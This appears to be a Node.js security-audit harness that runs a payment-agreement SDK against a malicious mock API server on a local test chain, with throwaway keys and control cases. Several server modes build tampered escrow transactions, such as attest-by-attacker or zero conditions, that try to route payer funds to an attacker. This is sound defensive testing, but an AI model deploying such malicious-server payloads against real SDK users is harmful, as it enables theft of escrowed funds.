// MINOR 5-A — Team A (Minor). Live SDK (sha f450d44d…, 54.263 B,
// snapshot live-api-minor5-a, byte-identical to Round 25) + Agreement
// v4.1 etched zerofee on fresh Anvil 4663. Real SDK verbatim + mock API.
// Throwaway local (anvil) keys only. No live POSTs, no real funds.
// Usage: node run-sdk-agree5.mjs <mode>   (fresh Anvil per run, port 8548)
//   k2049 : agree() WITHOUT conditions — server returns attest-by-attacker
//           (kind 1, target attacker, never attests). Expect: SDK SENDS
//           (expect=null, #matchConditions skipped, post-check ignores
//           conditions); release blocked at once + at expiry; stranger
//           refund after expiry returns payer whole 500, payee 0 (delay-only).
//   k2049c: CONTROL honest agree() WITH conditions attest-by-arbiter —
//           SDK sends; attest + release, payee +500.
//   k2049z: agree() WITHOUT conditions — server returns ZERO conditions.
//           Expect: SDK SENDS the tx but on-chain create REVERTS (v4.1
//           requires >=1 condition) — dead leg, no agreement, no funds move.
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  createPublicClient, createWalletClient, http as vhttp, defineChain,
  parseAbi, encodeFunctionData, encodeAbiParameters, parseUnits, erc20Abi,
  keccak256, toHex, getAddress,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { Bull } from "./sdk-live.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)));
const RPC = "http://127.0.0.1:8548";
const API_PORT = 3007;
const AGREEMENT = "0x7AB58fAAe65eFCF0037635382cAA546EaC233DA6";
const USDG = "0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168";
const ZERO = "0x0000000000000000000000000000000000000000";

const chain = defineChain({ id: 4663, name: "Robinhood Chain",
  nativeCurrency: { decimals: 18, name: "ETH", symbol: "ETH" },
  rpcUrls: { default: { http: [RPC] } } });
const victimKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
const arbiterKey = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
const attackerKey = "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a";
const strangerKey = "0x0000000000000000000000000000000000000000000000000000000000009999";
const victim = privateKeyToAccount(victimKey);
const arbiter = privateKeyToAccount(arbiterKey);
const attacker = privateKeyToAccount(attackerKey);
const stranger = privateKeyToAccount(strangerKey);
const V = victim.address, ARB = arbiter.address, A = attacker.address, S = stranger.address;

const publicClient = createPublicClient({ chain, transport: vhttp(RPC) });
const walletV = createWalletClient({ chain, transport: vhttp(RPC), account: victim });
const walletA = createWalletClient({ chain, transport: vhttp(RPC), account: attacker });
const walletR = createWalletClient({ chain, transport: vhttp(RPC), account: arbiter });
const walletS = createWalletClient({ chain, transport: vhttp(RPC), account: stranger });
const wall = () => Math.floor(Date.now() / 1000);

const AGR_ABI = parseAbi([
  "function createAgreement((address payee,address asset,uint256 amount,uint64 expiry,bytes32 termsHash,(uint8 kind,address target,bytes data,uint256 value)[] conditions) p,(uint256 feeWei,uint64 expiry,bytes sig) q) payable returns (uint256)",
  "function attest(uint256 id,uint256 index) returns (bool)",
  "function vote(uint256 id,uint256 index) returns (bool)",
  "function release(uint256 id) returns (bool)",
  "function refund(uint256 id) returns (bool)",
]);
const approveCall = (spender, amt) => encodeFunctionData({ abi: erc20Abi, functionName: "approve", args: [spender, amt] });
const tx = (to, data, value = "0") => ({ to, data, value });
const bal = (token, who) => publicClient.readContract({ address: token, abi: erc20Abi, functionName: "balanceOf", args: [who] });
const zero32 = "0x" + "00".repeat(32);
const termsHashOf = (terms) => (terms ? keccak256(toHex(String(terms))) : zero32);

async function rpc(method, params) {
  const r = await fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
  const j = await r.json(); if (j.error) throw new Error(method + ": " + JSON.stringify(j.error)); return j.result;
}
const toHex32 = (n) => "0x" + BigInt(n).toString(16).padStart(64, "0");
const current = { mode: "k2021" };
let fakeEscrow = null;

function mkAgr(payee, asset, amount, expiry, termsHash, conds) {
  return encodeFunctionData({ abi: AGR_ABI, functionName: "createAgreement",
    args: [{ payee, asset, amount, expiry: BigInt(expiry), termsHash, conditions: conds },
           { feeWei: 0n, expiry: BigInt(wall() + 3600), sig: "0x" + "00".repeat(65) }] });
}

const server = http.createServer(async (req, res) => {
  const body = await new Promise((r) => { let d = ""; req.on("data", (c) => (d += c)); req.on("end", () => r(d)); });
  const send = (o) => { res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify(o)); };
  if (req.url === "/api/v1/templates" && req.method === "POST") {
    const p = JSON.parse(body || "{}");
    const w = wall();
    const amt500 = 500n * 10n ** 6n;
    const expiry = (h) => BigInt(w + Math.round(h * 3600));
    const th = termsHashOf(p.terms);
    const mode = current.mode;
    const usdgAgr = (payee, conds, amount = amt500, ex = expiry(Number(p.expiryHours) || 72)) =>
      ({ transaction: tx(AGREEMENT, mkAgr(payee, USDG, amount, ex, th, conds)) });
    const approve = (token, amt) => ({ transaction: tx(token, approveCall(AGREEMENT, amt)) });
    let steps = [];
    if (mode === "k2021") { // panel quorum -> [attacker], k=1
      steps = [approve(USDG, amt500), usdgAgr(A, [
        { kind: 6, target: ZERO, data: encodeAbiParameters([{ type: "address[]" }], [[A]]), value: 1n },
      ])];
    } else if (mode === "k2022") { // optimistic kind-5 value=now (asked 48h)
      steps = [approve(USDG, amt500), usdgAgr(A, [
        { kind: 5, target: V, data: "0x", value: BigInt(w) },
      ])];
    } else if (mode === "k2022c") { // CONTROL honest optimistic 48h
      steps = [approve(USDG, amt500), usdgAgr(A, [
        { kind: 5, target: V, data: "0x", value: BigInt(w + 48 * 3600) },
      ])];
    } else if (mode === "k2023") { // balance_trigger data=balanceOf(attacker)
      const balMin = 1000000n * 10n ** 6n;
      const balData = encodeFunctionData({ abi: erc20Abi, functionName: "balanceOf", args: [A] });
      steps = [approve(USDG, amt500), usdgAgr(A, [
        { kind: 7, target: USDG, data: balData, value: balMin },
      ])];
    } else if (mode === "k2023c") { // CONTROL honest balance_trigger (holder=S, min 1M)
      const balMin = 1000000n * 10n ** 6n;
      const balData = encodeFunctionData({ abi: erc20Abi, functionName: "balanceOf", args: [S] });
      steps = [approve(USDG, amt500), usdgAgr(A, [
        { kind: 7, target: USDG, data: balData, value: balMin },
      ])];
    } else if (mode === "k2024") { // after_deal kind-4 target=FakeEscrow(settled)
      steps = [approve(USDG, amt500), usdgAgr(A, [
        { kind: 4, target: fakeEscrow, data: "0x", value: 1n },
      ])];
    } else if (mode === "k2025") { // confirmed_with_cooling kind-9 = 365d (asked 720h)
      steps = [approve(USDG, amt500), usdgAgr(A, [
        { kind: 1, target: ARB, data: "0x", value: 0n },
        { kind: 9, target: V, data: encodeAbiParameters([{ type: "uint256" }], [0n]), value: BigInt(365 * 24 * 3600) },
      ])];
    } else if (mode === "k2025c") { // CONTROL honest kind-9 = 720h
      steps = [approve(USDG, amt500), usdgAgr(A, [
        { kind: 1, target: ARB, data: "0x", value: 0n },
        { kind: 9, target: V, data: encodeAbiParameters([{ type: "uint256" }], [0n]), value: BigInt(720 * 3600) },
      ])];
    }
    return send({ steps });
  }
  if (req.url === "/api/v1/agreements" && req.method === "POST") {
    const p = JSON.parse(body || "{}");
    const w = wall();
    const amt500 = 500n * 10n ** 6n;
    const expiry = (h) => BigInt(w + Math.round(h * 3600));
    const th = termsHashOf(p.terms);
    const mode = current.mode;
    const usdgAgr = (payee, conds, amount = amt500, ex = expiry(Number(p.expiryHours) || 72)) =>
      ({ transaction: tx(AGREEMENT, mkAgr(payee, USDG, amount, ex, th, conds)) });
    const approve = (token, amt) => ({ transaction: tx(token, approveCall(AGREEMENT, amt)) });
    let steps = [];
    if (mode === "k2049") { // agree() no conditions -> server: attest-by-attacker
      steps = [approve(USDG, amt500), usdgAgr(A, [
        { kind: 1, target: A, data: "0x", value: 0n },
      ])];
    } else if (mode === "k2049c") { // CONTROL honest: attest-by-arbiter
      steps = [approve(USDG, amt500), usdgAgr(A, [
        { kind: 1, target: ARB, data: "0x", value: 0n },
      ])];
    } else if (mode === "k2049z") { // agree() no conditions -> server: ZERO conditions
      steps = [approve(USDG, amt500), usdgAgr(A, [])];
    }
    return send({ steps });
  }
  res.writeHead(404); res.end("{}");
});

async function tryCall(wallet, fn, id, idx = 0n) {
  try { await wallet.writeContract({ address: AGREEMENT, abi: AGR_ABI, functionName: fn, args: (fn === "attest" || fn === "vote") ? [BigInt(id), idx] : [BigInt(id)] }); return true; }
  catch { return false; }
}
const usdg = (x) => (BigInt(x) / 10n ** 6n).toString();

async function setup() {
  await new Promise((r) => server.listen(API_PORT, r));
  const agrZero = "0x" + fs.readFileSync(path.join(ROOT, "chain/bytecode/agreement-v41-zerofee.hex"), "utf8").trim().replace(/^0x/, "");
  await rpc("anvil_setCode", [AGREEMENT, agrZero]);
  await rpc("anvil_setStorageAt", [AGREEMENT, "0x0", toHex32(1n)]); // nextId = 1
  await rpc("anvil_setStorageAt", [AGREEMENT, "0xb", toHex32(1n)]); // guard slot 11
  const mocks = JSON.parse(fs.readFileSync(path.join(ROOT, "mocks/MockERC20.json"), "utf8"));
  const hash = await walletV.deployContract({ abi: mocks.abi, bytecode: mocks.bytecode.object, args: [] });
  const addr = (await publicClient.waitForTransactionReceipt({ hash })).contractAddress;
  const code = await publicClient.getCode({ address: addr });
  await rpc("anvil_setCode", [USDG, code]);
  await rpc("anvil_setStorageAt", [USDG, "0x2", toHex32(6n)]); // decimals = 6
  await walletV.writeContract({ address: USDG, abi: mocks.abi, functionName: "mint", args: [V, 500000n * 10n ** 6n] });
  if (current.mode === "k2024") {
    const fake = JSON.parse(fs.readFileSync(path.join(ROOT, "poc/round24-c/chain/out/Mocks.sol/FakeEscrow.json"), "utf8"));
    const h2 = await walletV.deployContract({ abi: fake.abi, bytecode: fake.bytecode.object, args: [2n] });
    fakeEscrow = (await publicClient.waitForTransactionReceipt({ hash: h2 })).contractAddress;
  }
}

async function main() {
  const mode = process.argv[2] || "k2021";
  current.mode = mode;
  await setup();
  const bull = new Bull({ walletClient: walletV, publicClient, baseUrl: `http://127.0.0.1:${API_PORT}` });
  const results = [];
  const push = (o) => { results.push(o); console.log(`[${o.case}]`, JSON.stringify(o)); };

  if (mode === "k2049") {
    const payerBefore = await bal(USDG, V);
    const payeeBefore = await bal(USDG, A);
    let id = null, err = "";
    try { id = await bull.agree({ payee: A, asset: "usdg", amount: "500", terms: "Deliver the report", expiryHours: 72 }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!id;
    let relEarly = false, relAtExpiry = false, ref = false;
    if (sent) {
      relEarly = await tryCall(walletA, "release", id);
      await rpc("anvil_increaseTime", [72 * 3600 + 1]);
      relAtExpiry = await tryCall(walletA, "release", id);
      await rpc("anvil_setBalance", [S, "0x8ac7230489e80000"]);
      ref = await tryCall(walletS, "refund", id);
    }
    const payerAfter = await bal(USDG, V);
    const payeeAfter = await bal(USDG, A);
    push({ case: "K-2049 agree() no conditions, server attest-by-attacker", sdkSent: sent, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, releaseImmediatelyBlocked: !relEarly, releaseAtExpiryBlocked: !relAtExpiry, strangerRefundAfterExpiry: ref, payerRestoredToPreDeal: payerAfter === payerBefore, payeeGainedUsdg: usdg(payeeAfter - payeeBefore), delayOnly: sent && !relEarly && !relAtExpiry && ref && payerAfter === payerBefore && (payeeAfter - payeeBefore) === 0n });
  }
  if (mode === "k2049c") {
    const before = await bal(USDG, A);
    let id = null, err = "";
    try { id = await bull.agree({ payee: A, asset: "usdg", amount: "500", terms: "Deliver the report", expiryHours: 72, conditions: [{ type: "attest", by: ARB }] }); }
    catch (e) { err = String(e.message || e); }
    const sent = !!id;
    let att = false, relEarly = false, rel = false;
    if (sent) {
      relEarly = await tryCall(walletA, "release", id);
      att = await tryCall(walletR, "attest", id);
      rel = await tryCall(walletA, "release", id);
    }
    const after = await bal(USDG, A);
    push({ case: "K-2049c CONTROL agree() with attest-by-arbiter", sdkSent: sent, sdkThrew: err.slice(0, 300), agreementId: id ? String(id) : null, releaseBeforeAttestBlocked: !relEarly, arbiterAttested: att, releasedAfterAttest: rel, payeeGainedUsdg: usdg(after - before) });
  }
  if (mode === "k2049z") {
    let id = null, err = "";
    try { id = await bull.agree({ payee: A, asset: "usdg", amount: "500", terms: "Deliver the report", expiryHours: 72 }); }
    catch (e) { err = String(e.message || e); }
    push({ case: "K-2049z agree() no conditions, server ZERO conditions", sdkSent: !!id, sdkThrew: err.slice(0, 400), agreementId: id ? String(id) : null, sdkCheckPassedChainReverted: !err.includes("Bull SDK safety check failed") && /revert|failed/i.test(err), noAgreementCreated: !id, note: "SDK sends (no conditions check) but v4.1 create reverts: zero-condition leg dead at chain" });
  }
  console.log(JSON.stringify(results, null, 2));
  fs.writeFileSync(path.join(ROOT, `node-result-${mode}.json`), JSON.stringify({ mode, sdk: "f450d44df1812a6b9254c7b8cbac8aab89e94301cb86727f439643dfad47efae", agreement: "v4.1-0x7AB58fAAe65eFCF0037635382cAA546EaC233DA6", results }, null, 2));
  server.close();
  process.exit(0);
}
main().catch((e) => { console.error("RUNNER FATAL", e); server.close(); process.exit(2); });
